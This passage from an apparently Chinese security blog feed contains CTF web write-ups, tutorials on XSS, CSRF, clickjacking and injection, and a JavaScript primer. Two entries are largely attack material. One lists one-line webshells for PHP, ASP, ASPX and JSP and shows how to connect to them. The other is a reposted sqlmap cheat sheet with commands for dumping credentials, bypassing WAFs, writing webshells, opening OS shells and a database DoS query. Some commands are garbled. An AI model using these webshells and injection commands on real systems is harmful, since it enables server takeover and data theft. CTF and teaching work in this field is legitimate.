    <content type="text"><![CDATA[一、第12题（头等舱）先尝试火狐浏览器的开发者工具，发现响应头为136字节，可是参数确说有139字节，隐藏了3个字节那么我们使用burp suit 抓包，然后使用repeater功能，go一下发现flag（flag即为隐藏的字节） 二、第13题（网站被黑）首先，根据域名和网页提示，我们需要找到网站后台。我们使用御剑工具直接扫除后台成功扫出网站后台进入网站后台，尝试了一些admin,password常用的密码之后，发现登入不了。我们使用burp suite,爆破功能进行爆破扫出密码为hack,输入密码即可得到flag 三、第14题（管理员系统）使用火狐浏览器开发者工具查看源码发现有段加密的base64代码解密后为test123，题目又提示，IP禁止访问，请联系本地管理员登陆，IP已被记录.。那么我们就给header添加个X-Forwarded-For: 127.0.0.1参数。 四、第15题（web4）观察源码发现，有一堆utf-8加密的字符，那么我们进行utf-8解密这个是解密后的结果观察eval函数语句可知，我们应该输入，p1+54aa2+p2的值,输入果然得出flag 五、第十六题（flag在index里）点击进去。发现这是个文件包含漏洞那么我们采用PHP伪协议，输入http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php会发现出现了base64代码。进行解码得到index.php的源码，发现flag被注释掉这就是我们为什么要使用base64编码输出的原因。 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt; php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。 通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。 而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码 本题参考这篇博客解答：https://blog.csdn.net/zpy1998zpy/article/details/80585443]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 1~11题 write up（web）]]></title>
    <url>%2F2019%2F03%2F06%2Fbugku-1-11%2F</url>
    <content type="text"><![CDATA[一、第一题（web2）查看源代码，查找flag,即可得出flag。 二、第二题（计算器）输入163，发现只能输入一位数。位数被限制了。我们使用火狐浏览器的开发者工具（F12）调出来。定位到输入框的位置。发现最大位数被限制了，把1改成3即可得出flag。 三、第三题(web基础$_GET)打开题目发现是PHP代码，阅读代码可知，我们在URL中传入参数?what=flag即可得出flag 四、第四题(web基础$_POST)打开题目发现是PHP代码，阅读代码可知，需要使用POST方式传值。使用火狐浏览器的hackbar插件，如图 五、第五题（矛盾）先介绍下is_numeric()函数：is_numeric() 函数用于检测变量是否为数字或数字字符串。PHP 版本要求：PHP 4, PHP 5, PHP 7如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。 分析代码，可知，num必须==1，但是又不能是数字或者是数字字符串。 ==又表示只要值相等就可以了。那么我们可以在输入num=1XXX，xxx表示非数字。 六、第六题（web3）1、进入题目发现一直在弹窗，点了几遍确定后感觉被耍了。2、阻止弹窗查看源码。发现flag在最后一行的alert标签里。且被注释掉3、发现flag是&amp;#x类型的，这是unicode编码。不知道也没事，百度下就可以知道4、百度搜索unicode在线解码，就可以得出flag。 七、第七题（域名解析）看到题目域名解析我们就要想到hosts文件。我们打开hosts文件hosts文件位置C:\Windows\System32\drivers\etc在文件末尾加入123.206.87.240 flag.baidu.com在浏览器中输入flag.baidu.com或者123.206.87.240 即可得出flag 八、第八题（必须让他停下来）打开题目发现一直在刷新，观察源码，发现flag应该在图片刷出来的时候出现。我们使用burp suit进行抓包放包，经过了j几次（GO）操作之后，我们发现了flag. 九、第九题本地包含观察代码发现flag.php被隐藏起来了。尝试下传入参数?hello=hello,发现hello在下面代码中体现这样我们就可以直接传入参数输出flag.php文件的内容，发现flag。传入的参数是?hello=file(“flag.php”) 十、第十题（变量1）观察源码发现代码最后一行有个可变变量。我们让args=GLOBALS 全局数组变量 因为$args=GLOBALS 又var_dump($$args) ，所以和前面那个$ ，组成$GLOBALS flag变量又在$GLOBALS中，var_dump eval 成功得到flag $GLOBALS介绍 $GLOBALS[&#39;var&#39;]是外部的全局变量本身,在函数内部可以使用$GLOBALS数组调用2.作用域：Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 $GLOBALS超全局数组适用于任何地方 十一、第十一题（web5）首先介绍下JSPFUCkJSFuck（或为了避讳脏话写作 JSF*ck ）是一种深奥的 JavaScript编程风格。以这种风格写成的代码中仅使用 [、]、(、)、! 和 + 六种字符。此编程风格的名字派生自仅使用较少符号写代码的Brainfuck语言。与其他深奥的编程语言不同，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生 JavaScript 解释器皆可直接运行。鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式。简单地说，就是有人不想让自己的代码被别人认出来，用6种字符改造了自己的js代码 我们查看源码发现有一堆的 [、]、(、)、! 和 + ，把他们扔进浏览器控制台（火狐浏览器按F12打开控制台）进行调试，即可得出flag,记得要大写。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS和CSRF之介绍]]></title>
    <url>%2F2019%2F03%2F06%2Fxss1%2F</url>
    <content type="text"><![CDATA[一、什么是XSS全称：Cross Site Script中文名称：跨站脚本危害：盗取用户信息、钓鱼、制造蠕虫等 概念： 二、xss的分类1、存储型访问网站时，触发XSS我们可以通过查看网页源代码的方式查看xss的触发点。 我们安装irebug（F12快捷件打开），利用该火狐插件来寻找注入点。 分析其攻击过程但是xss脚本是怎样被黑客写入数据库呢2、反射型访问携带xss脚本的连接时触发xss 查看源码，寻找触发点 如何产生的呢（右边为xss源码）分析攻击过程 存储型xss和反射型xss的区别存储型xss是从数据库中提取xss的脚本内容反射型xss是直接从url的内容中提取出xss的脚本的内容 3、DOM型那什么是DOM呢，就是Document Object Model,即文档对象模型，它允许脚本（js）控制web的页面、窗口和文档。简单说DOM就是就是js操作html时的API(应用程序接口) 访问携带xss脚本的连接时触发xss 查看源码，了解触发点 分析原理 DOM型xss与反射型xss很类似，但是他们有什么区别呢DOM型xss是通过前端javascript将xss脚本写入DOM中，触发xss 反射型xss是通过后端或应用程序将xss脚本写入响应页面中，浏览器响应页面时才触发xss 存储型xss漏洞演示 xss代码应该为&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;，用管理员员登入后台，进入留言板会触发xss,出现弹窗内容为/xxxx/ 反射型xss漏洞演示我们写一个这样的脚本文件，命名为index.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_REQUEST[&quot;name&quot;])) { $name=$_REQUEST[&quot;name&quot;]; } else{ $name = &quot;&quot;; } echo &quot;hhhhh &quot;.$name; ?&gt; 本地访问下传入参数？name=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;alert（）方法用于显示一条指定的消息和一个ok按钮的警告框用qq浏览器尝试下，xss注入被浏览器拦截了，尴尬了 用火狐浏览器再次尝试，成功注入xss查看源码即可发现注入位置DOM型xss漏洞这边就不演示了 4、小结 三、CSRF是什么全称：Cross-site request forgery 中文名称是：跨站请求伪造 危害：执行恶意操作（”被转账“、“被发垃圾评论”等）、制造蠕虫······· 概念：利用客户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作 分析原理那里面恶意的网站是怎么做的呢？ 正常情况下：通常Cookie中会存放用户凭证信息浏览器在发送任何请求时都会带上已有的cookie通过cookie识别用户身份后，执行转账操作。 黑客的操作：伪造攻击代码，打开页面时自动完成转账]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Clickjacking(点击劫持)]]></title>
    <url>%2F2019%2F03%2F06%2FClickjacking%2F</url>
    <content type="text"><![CDATA[一、前置知识首先介绍下html下的iframe标签的作用：可以创建包含另一个文档的内联框架。例如下面这个代码。运行下面这个网页，发现他和网易安全中心的页面几乎一样，除了url不一样 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;网易安全中心&lt;/title&gt; &lt;style &gt; html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 案例，图片的背后是隐藏的网站。 二、什么是点击劫持呢通过覆盖不可见的框架误导受害者点击而造成的攻击行为。 三、点击劫持的特点1、隐蔽性高 2、骗取用户操作 3、UI-覆盖攻击 4、利用了iframe标签或者其他标签的属性 四、实例分析代码如下，效果如下 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;点击劫持&lt;/title&gt; &lt;style &gt; /*设置高度、宽度*/ html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } /*设置隐藏网页的可见度*/ iframe{ /*opacity: 0;*/ filter: alpha(opacity=0);/*IE*/ -moz-opacity:0.5;/*Moz+FF*/ opacity: 0.5;/*支持css3浏览器（FF1.5也支持）*/ position: absolute; z-index: 2;/*网页的堆叠层次*/ } /*设置按钮的位置*/ button{ position: absolute; top: -70px; left: 800px; z-index: 1; width: 72px; height: 26px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 再做次修改效果，以及完全看不出背后的网易网页了。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URL跳转、命令注入、文件操作类漏洞介绍]]></title>
    <url>%2F2019%2F03%2F06%2FURL%2F</url>
    <content type="text"><![CDATA[一、什么是URL跳转漏洞呢借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。 二、实现方式1、Header头跳转实现代码2、javascript跳转实现代码3、meta跳转 三、原理分析 四、什么是命令注入系统命令注入 五、web应用如何注入命令PHP执行命令的注入例如分析攻击过程 六、常见的文件操作 七、常见的文件操作漏洞1、文件上传漏洞2、任意文件下载漏洞3、文件包含漏洞文件包含漏洞包括本地文件包含和远程文件包含]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[browser]]></title>
    <url>%2F2019%2F03%2F06%2Fbrowser%2F</url>
    <content type="text"><![CDATA[·浏览器安全性特性 一、介绍chrome浏览器1、如何修改安全设置？常规设置步骤快捷设置步骤2、如何清除缓存3、每一次都去清除缓存太麻烦了，可以使用隐身模式（无痕模式） 在功能菜单中选择新建无痕窗口即可3、如何查看网页源代码呢？4、如何查看DOM元素？F12直接打开下面的开发者工具栏5、如何查看网络数据包 二、介绍火狐浏览器火狐浏览器有个强大的插件库1、如何修改安全设置 三、介绍IE浏览器如何修改安全设置]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[脚本木马的制作与原理(主要介绍一句话木马)]]></title>
    <url>%2F2019%2F03%2F03%2Fmuma%2F</url>
    <content type="text"><![CDATA[webshell（web后门）一、一句话木马短小精悍，功能强大，隐蔽性好。 &lt;% execute request(&quot;value&quot;) %&gt; 说明：使用request的话，post和get两中方式传来的数据都可以接受。 execute用来执行客户端传来的数据。 代码本身没有危害，关键在于我们传输的数据是什么。 常见写法asp一句话木马 &lt;%eval request(&quot;c&quot;)%&gt; php一句话木马 &lt;?php @eval($_POST[‘value’]);?&gt; aspx一句话木马 &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.ltem[&quot;value&quot;])%&gt; jsp一句话木马 &lt; % if(request.getParametere(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;)))write(request.getParameter(&quot;t&quot;).getBytes());% &gt; 利用中国菜刀进行连接这边我用phpstudy做演示，需要把一句话木马文件放在网站根目录。一句话木马内容为 &lt;?php @eval($_REQUEST[&apos;xx&apos;]); ?&gt; 可以手动获取信息我们把一句话木马内容改成 &lt;?php @system($_REQUEST[&apos;xx&apos;]); ?&gt; 这样可以执行系统命令。注意再次使用中国菜刀连接其他链接之前，需要重置下缓存。在浏览器输入 http://localhost/123.php?xx=ipconfig 执行系统命令 图片木马的制作上传到服务器后不能直接执行，得想办法改成脚本格式或者在特定环境下以脚本运行 一句话使用技巧 二、小马、大马还有其他木马，如打包马、脱裤马等等]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基础]]></title>
    <url>%2F2019%2F03%2F03%2Fjs%2F</url>
    <content type="text"><![CDATA[一、概述JavaScript 是互联网上最受欢迎的编程语言之一，用于为网页添加交互性，处理数据，以及创建各种应用程序（移动应用程序，桌面应用程序，游戏等）,这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。 二、用法在html中必须写在&lt;script&gt;&lt;/script&gt;中写入js代码。在网页中通常通过head和body增加javascript。 二、基础语法1、javaScript的输出 使用doument.write()方法将内容写到html页面中如： &lt;script&gt;document.write(&quot;hhhh&quot;) &lt;/script&gt; 2、window.alter()弹出警告框 &lt;script&gt;window.alter(&quot;hhhh&quot;) &lt;/script&gt; 3、用innerHTML写入到html元素中 demoP.innerHTML=&quot;a=&quot;+a+&quot;,b=&quot;+b; 4、使用console.log（）写入到浏览器的控制台。 5、document.getElementById(“demo”) 是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。 6、 innerHTML = “Paragraph changed.” 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。 7、格式化文本使用html标签来格式化javascript中的文本如： &lt;script&gt; document.write(&quot;&lt;h1&gt;hello world&lt;/h1&gt;&quot;); &lt;/script&gt; 8、&lt; script &gt;标签language和type两个属性，指定脚本类型 &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; 9、外部javascript在多个不同网页中使用相同的代码时，外部脚本是很实用的，javascript文件的文件后缀是.js。要使用外部脚本，将脚本文件的名称放在&lt; script &gt;标签的src属性中。 &lt; script src=&quot;index.js&quot;&gt;&lt; /script &gt; 注意：外部脚本不能使用&lt; script&gt;标签包裹，可以在&lt; head&gt;或&lt; body&gt;中放置外部脚本引用，将javascript放在外部文件中具有以下优点：（1）分离html和代码。（2）使html和javascript更容易阅读和维护。（3）缓存的javascript文件可以加快页面加载速度。 10、js变量声明用var来声明变量，注意js是区分大小写的 var x=5 变量命名的规则：a.变量必须以字母开头。b.变量也能以$和_符号开头（不推荐）。c.大小写不一样。d.变量名称不能包含空格。 11、基本数据类型只有一种数字类型，可以带小数，也可以不带。可以使用科学记数法来书写 var y = 123e5 ;//&lt;!--12300000--&gt; var y = 123e-5 ;//&lt;!--0.00123--&gt; 字符串，用单引号、双引号都可以 var pangzi = &quot;yang xiao pang&quot; ; var pangzi = &apos;yang xiao pang&apos; ; 但如果想在引号中再使用引号，须使用“\”转意处理引号中的引号。（如果引号类型不同则不用） var p= &quot;y \&quot;xiao p\&quot;&quot; ; var p = &apos;y \&apos;xiao p\&apos;&apos; ; 12、布尔：当值为0，null，undefined，空字符串时，布尔值为false。任何拥有值的字符串其布尔值为true。 13、数组 &lt;script&gt; var fatty = new Array(); fatty[0] = &quot;杨小胖&quot;; fatty[1] = &quot;景小胖&quot;; document.write(fatty); &lt;/script&gt; 或 &lt;script&gt; var fatty = new Array(&quot;杨小胖&quot;,&quot;景小胖&quot;); document.write(fatty); &lt;/script&gt; 14、复杂数据类型**对象 var fatty = {firstname = &quot;yang&quot;,lastname=&quot;yi&quot; ,id:1209｝; 对象的两种寻址方式： name = person.lastname; name = person[&quot;lasrname&quot;]; 声明变量类型：用new声明 var fatty = new String; 注意javascript变量均为对象，当声明一个变量时，就创建了一个新的对象。]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap常见的11种方法]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap2%2F</url>
    <content type="text"><![CDATA[本文转载https://www.cnblogs.com/ichunqiu/p/5805108.html这篇文章一共有11种常见SQLmap使用方法： 一、SQLMAP用于Access数据库注入 (1) 猜解是否能注入12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; (2) 猜解表 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables (3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表) 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin (4) 根据字段猜解内容(假如通过3得到字段为username和password) 123 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,[url=]B[/url]password&quot; 二、SQLMAP用于Cookie注入 (1) cookie注入，猜解表 1 win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 (2) 猜解字段，(通过1的表猜解字段，假如表为admin) 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2 (3) 猜解内容 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T admin -C &quot;username,password&quot; --level 2 三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell 1234 win: python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell Linux: sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell (2) 输入执行语句完成DDOS攻击 1 select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) 四、SQLMAP用于mysql注入 (1) 查找数据库 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs (2) 通过第一步的数据库查找表(假如数据库名为dataname) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables (3) 通过2中的表得出列名(假如表为table_name) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns (4) 获取字段的值(假如扫描出id,user,password字段) 12 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump 五、SQLMAP中post登陆框注入 (1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令： 1./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp 几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass (2) 自动的搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –forms (3) 指定参数搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –data “tfUName=321&amp;tfUPass=321” 六、SQLMAP中Google搜索注入 inurl后面的语言是由自己定的 注入过程中如果选y是注入，如果不是选n 1sqlmap -g inurl:php?id= 七、SQLMAP中的请求延迟参数 –delay –safe-freq 12python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –delay 1python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –safe-freq 3 参数 八、SQLMAP绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=1 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 –dbs –batch –tamper “space2morehash.py” space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py 都是编码方式 space2hash.py base64encode.py charencode.py 九、SQLMAP查看权限 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –privileges 十、SQLMAP伪静态注入(1) 查找数据库 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –dbs (2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname) 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname –tables (3) 通过2中的数据表得到字段(假如得到的是tablename表) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename –columns (4) 通过3得到字段值(假如从3中得到字段id，password) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename -C “password” –dump 十一、SQLMAP注入点执行命令与交互写shell (1) 注入点：http://192.168.159.1/news.php?id=1 此处采用的是Linux系统 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-cmd=ipconfig 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ (2) 获取Shell 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-shell 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ 输入ipconfig/all 创建用户和删除用户 只要权限足够大，你可以输入使用任何命令。 其他命令参考下面： 从数据库中搜索字段 1sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件 首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 #示例： 1sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： 1sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录： “E:\php\htdocs\dvwa” #注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令： -is-dba 当前用户权限（是否为root权限） -dbs 所有数据库 -current-db 网站当前数据库 -users 所有数据库用户 -current-user 当前数据库用户 -random-agent 构造随机user-agent -passwords 数据库密码 -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项）：-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1） Target（目标）： 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）： 这些选项可以用来指定如何连接到目标URL。 -data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell Optimization（优化）：这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页 Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹 Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 